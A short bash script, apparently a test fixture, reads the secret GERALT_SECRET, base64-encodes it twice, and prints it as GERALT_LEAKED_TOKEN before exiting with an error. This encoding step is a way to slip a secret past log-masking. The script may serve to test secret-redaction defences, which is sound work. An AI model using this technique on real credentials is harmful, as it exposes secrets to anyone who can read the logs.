#!/bin/bash
TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | tr -d '\n' | base64 | tr -d '\n')
echo "GERALT_LEAKED_TOKEN=${TOKEN}"
exit 1
